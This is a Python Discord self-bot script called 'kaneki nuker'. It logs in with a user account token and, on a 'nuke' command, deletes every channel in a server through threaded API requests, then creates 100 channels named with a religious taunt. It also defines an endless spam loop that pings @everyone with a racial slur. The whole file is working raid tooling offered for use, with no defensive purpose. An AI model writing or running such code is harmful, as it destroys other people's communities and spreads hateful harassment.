
from asyncio import threads
import discord
from discord.ext import commands
import requests
import os
import asyncio
import json
import threading
import colorama
from colorama import Fore
os.system("title kaneki nuker")

colorama.init()
with open ("config.json") as f:
    data = json.load(f)
    token = data["token"]
    prefix = data["prefix"]


kaneki = commands.Bot(command_prefix = prefix,self_bot = True)

if token == "":
    token = input(f"{Fore.RED}your token {Fore.GREEN}>>> ")
    os.system("cls")

else:
    pass

headers = {
     "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accempt-language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": token,
        "content-length": "0",
        "content-type": "application/json",
        "cookie": '__dcfduid=4cf3f0609a2711ec9db64d2ba676c4df;__sdcfduid=4cf3f0619a2711ec9db64d2ba676c4df23f42966cb7d3f125b01959c9d469a6e50870d51a8d24fa89ad053f78e97dc4e',
        "origin" : "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-GB",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijk4LjAuNDc1OC4xMDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTE1NjMzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
}  


payload = {

}



print(f"""{Fore.RED}
        ▄█   ▄█▄    ▄████████ ███▄▄▄▄      ▄████████    ▄█   ▄█▄  ▄█  
        ███ ▄███▀   ███    ███ ███▀▀▀██▄   ███    ███   ███ ▄███▀ ███  
        ███▐██▀     ███    ███ ███   ███   ███    █▀    ███▐██▀   ███▌ 
       ▄█████▀      ███    ███ ███   ███  ▄███▄▄▄      ▄█████▀    ███▌ 
      ▀▀█████▄    ▀███████████ ███   ███ ▀▀███▀▀▀     ▀▀█████▄    ███▌ 
        ███▐██▄     ███    ███ ███   ███   ███    █▄    ███▐██▄   ███  
        ███ ▀███▄   ███    ███ ███   ███   ███    ███   ███ ▀███▄ ███  
        ███   ▀█▀   ███    █▀   ▀█   █▀    ██████████   ███   ▀█▀ █▀  

                      ▄     ▄   █  █▀ ▄███▄   █▄▄▄▄ 
                       █     █  █▄█   █▀   ▀  █  ▄▀ 
                  ██   █ █   █ █▀▄   ██▄▄    █▀▀▌  
                  █ █  █ █   █ █  █  █▄   ▄▀ █  █  
                  █  █ █ █▄ ▄█   █   ▀███▀     █   
                  █   ██  ▀▀▀   ▀             ▀    
                   made by Frank Woods. Enjoy!                                
    """)

@kaneki.event
async def on_ready():
     await kaneki.change_presence(activity=discord.Streaming(name="""
.̸̛̱̄͆͑̅͐͒̓̍͝ͅ-̵̨͇̯͋̾̏͐̽͜.̸̢̹̱̱͓͚͔̆͒-̶̭̲̪̩̻̪̘͖͓͓́̎̂̑̍͗̂̊̃́-̴̛͎͇̭͙̒̏̒͂̚.̷͚̯̖̞̤͎̍̂̈́̂͛͗͌̕͘-̶̨̘̖̼̬́̈́̈̏͜ͅ.̷̢͕̪̝̻͎̗̳͔͊͆̌-̴̨̣̮͈̝͑͐̎́͆͛̐͌͘.̴̧̛͉̠̂̿̎͆̋̂͒̅̚-̶̮̬̱̞̳͈͎̽̀.̵̮͇̰͉̞͖͖̃̀́͐̑̋-̵̗̲̪̰̳̠̜̤̳̰̃̄̓̒̚-̵̧̖͓̬̼͍̖̠̝̣̔͑͒̉͊͛̏͐͘.̴͓̑̽̃̏̆-̶̖̫̳̮̀-̷̧̨̞͍̠̞̮̪̪̍̈́̀͆́͋͠-̶̡͙̲̳̯̤̟̩̭͋͆͗͘ͅ-̴̻̗̬̂̈̅̄͌̕͘͜-̵͎̳̗̮͕̻̝̪͓̈́̊̐́̈́̓͒̚-̷͇̟͇̭͙̘̤̞̏͋́͊̓̌́̕͝ͅ-̷̨̡̜̱͇̺̦͎̼̆̀̾̑͑̀̒-̷̙̲̫̌͌̍̈́̇͝ͅ-̸̝̤͈͖̓͑̄͒̊͌̒̓͘͝-̴̯̯͚̱̈́͊̌̏̽̕͜.̴̡̛̝͉͉̝͛̈́̿̍̃̆̀͛͝.̸̨̢̛̠̯̠͚͕͖̹́́̾͛̕͠.̷̧̥̟̹̝̖͇̫̳̪̄̊̏͘̕͝͝.̷͖̄̈́̍.̶͖̦͔̯̫̯̝̈́́̄̃.̸̠̍͌̀̄̇̒̒̈́͊̚.̸̺̻̠͊́͋͝.̸̧̛͕͕̉̌̇͗̒͊̑-̵̛̟͙͓͚͓̦̙̥̝̥͌̾̊̎͋̒̑-̷͈̦̥̙̬̥̩̔.̶̛̘̀-̷̧̧̢̣̺̩͎̖̆͐̇̾͌͆̚ͅ.̸̞͍̭̰̻̖̀̑̂̃̅̎̈-̸̛̺̻̝̻͍̘̓-̸͓̩͗̀͝,̸̡̛̳͐̀̽͐̾.̶̛̘̬̜̲̦̭̽͗̏͐̋̈́͜͝,̸̲̟̫̱̳̠́͒̽̓̎̊̈́͛̀̌-̷̫̝̮͕̙̪̮͗̈̒̌ͅ,̴̡̧̛̹̩̺̰̥̻̄̒̅̋͗.̴̗͋̀̚,̴̹͛̔̀̈́̋̕͝-̶̯̺̦͛̀̏̽͊͐̽̓̕͝.̵̹̼̃̔̀͊́̚,̸̧̧̧̛̠͖̲̠̾̌̎́̐̄̀͋̕-̵̦͚̩͇̩̥͆̍̿.̸̡̹͈̞̰͉̙̪̌̐̓̿̾͆̂̉́͠-̸̻͔̯̀͋͊̈́́́̈̑͝͠.̶̪͖͚͖̎̓͋̇̓̆͘͝/̵̰̞̞̦̩̺͚͙̺̐̾́̌̇́͜/̶͓̱͈̐/̵̛͖̐͆7̶̛͙̪̻̥͍̯̖̦́̀̏̍̐̿͐͘-̴̨̧͔͎͚̦̰̫͈̓̿̋͒̚.̵̢̘̹̗̲̟̳̘̩̅̃ͅ-̶͚̈́͜ͅ,̶̥̤͚̓͜͜.̷̙̀̈́͂͛͊̈́͛͝-̶̧̱͎̺̈́͗̚͝.̷̟̮̼̥̪̣̥͍̺̇͗͌̓͐̄̈́̓͘͝-̶̛̛͕̙̇̔͆͆̃9̴̢̨̧̩̰̬̰͎͙̖̔̒̂̒͆͝8̴̼̐͛̇͆̂̊4̵̙̙͇̦̩̳̹̗͖͌͑͒3̶̢̨̨̻̺͍̜̲̽̈́̐͐9̶͇̈́̀́̓́̽͋̾8̵̲̖̠͖͆̎̄͜3̸̺͓̏̂̾̈́4̶̯͊̎̒͂̂̒7̸̛̦̦̲̥͙̽̉͊̓̀̃̃̄3̸̨̱̻̎̂̀͛8̴͖̦͋́̄͂͗̐͗̋̓͠
""",url="https://www.twitch.tv/#"))

@kaneki.command()
async def nuke(ctx):
    await ctx.message.delete()
    

    def delete_channels(channel_id):
        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers = headers,data = payload)
  
   

    def create_channels():
        guild = ctx.guild.id
        payload = {
            "name": "allah akbar"
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers = headers,json = payload)

    def spam(channel_id):
        payload = {"content":"@everyone nigga"}
        while True:
         requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",headers = headers,data = payload)
    try:
        for channel in ctx.guild.channels:
            threading.Thread(target=delete_channels, args=(channel.id,)).start()
        
        for x in range(100):
            threading.Thread(target=create_channels).start()
    except Exception as e:
         print(e)
   

        



kaneki.run(token,bot = False)
